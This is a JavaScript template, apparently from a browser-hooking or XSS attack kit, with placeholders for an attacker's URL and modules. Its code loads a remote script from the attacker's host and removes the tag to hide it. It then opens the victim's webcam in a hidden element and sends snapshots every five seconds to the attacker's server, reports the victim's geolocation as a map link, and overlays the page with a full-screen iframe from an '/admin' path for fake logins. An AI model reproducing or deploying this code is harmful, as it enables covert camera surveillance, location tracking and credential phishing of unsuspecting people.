var script = document.createElement('script');
script.src = '{hack}';
script.onload = start;
document.head.appendChild(script);
document.head.removeChild(script);
function start(){
    {module}
}
function login(){
    var script2 = document.createElement('script');
    script2.src = '{url}/login';	
    document.head.appendChild(script2);
    document.head.removeChild(script2);
    {mysql}
}
function photo(){ 
    var v = document.createElement('video');
    v.autoplay=true;
    v.id='vid';
    v.style.display='none';
    document.body.appendChild(v); 
    if (document.getElementById('canvas') == null) {
        var c = document.createElement('canvas');
        c.id = 'canvas';
        c.width = "480";
        c.height = "320";
        c.style.display = "none";
        document.body.appendChild(c);
   }
    video = document.querySelector("#vid");
    var canvas = document.querySelector('#canvas');
    ctx = canvas.getContext('2d');
    localMediaStream = null;
    var onCameraFail = function (e) {
        sendXHR("No camera permissions", 'data');
    };
    navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
    window.URL = window.URL || window.webkitURL;
    navigator.getUserMedia({video:true}, function (stream) {
    try {
        video.srcObject = stream;} catch (error) {
        video.src = window.URL.createObjectURL(stream);}
    localMediaStream = stream;
    window.setInterval("snapshot()", 5000);
}, onCameraFail);script = document.createElement('script');script.id = 'webcamsnap'; document.body.appendChild(script);
}

function sendXHR(data, type)
{
    var xmlhttp= new XMLHttpRequest();
    url = "{url}/" + type
    xmlhttp.open("POST",url,true);
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xmlhttp.send("data="+data);
}
function showPosition(position) {
    var map ='https://www.google.com/maps/search/'+ position.coords.latitude+','+position.coords.longitude;
    sendXHR(encodeURIComponent(map), 'data');
   
}
function positionError(error) {
    sendXHR("getCurrentPosition error", 'data');
}
function address(){
    if (navigator.geolocation) 
	{
        navigator.geolocation.getCurrentPosition(showPosition, positionError);
    } else 
	{ 
        sendXHR("Geolocation is not supported by this browser.", 'data');
    }
}
function snapshot(){
    if (localMediaStream) {
        ctx.drawImage(video, 0, 0, 480, 320);
        var dat = canvas.toDataURL('image/png');
    	var x=encodeURIComponent(dat);
        sendXHR(x, 'photo');
    } else {
        sendXHR("No stream",'data');
    }
}
function mysql(){
    setTimeout(function(){
        parent.document.writeln("<iframe style='margin:0px;padding:0px;height:100%;width:100%;' src='{url}/admin' frameBorder=0 scrolling=no></iframe>");
        setTimeout(function(){
            document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
        setTimeout(function(){
            parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
    },1000);
}